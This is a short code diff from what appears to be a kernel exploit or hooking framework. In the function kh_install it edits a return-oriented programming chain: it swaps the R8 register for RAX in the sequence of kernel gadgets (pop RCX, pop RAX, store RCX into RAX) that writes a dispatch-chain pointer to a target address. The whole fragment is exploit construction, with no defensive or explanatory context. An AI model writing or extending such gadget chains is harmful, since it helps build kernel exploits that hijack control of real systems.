@@ -390,9 +390,9 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
 #ifdef AP_DIAG_PRESTAGE_1270
     off = putq(img, off, kgadget(KERNEL_GADGET_POP_RCX));
     off = putq(img, off, ist);
-    off = putq(img, off, kgadget(KERNEL_GADGET_POP_R8));
+    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RAX));
     off = putq(img, off, disp_chain);
-    off = putq(img, off, kgadget(KERNEL_GADGET_STORE_RCX_R8));
+    off = putq(img, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
 #else
     off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
     off = putq(img, off, ist - 8);
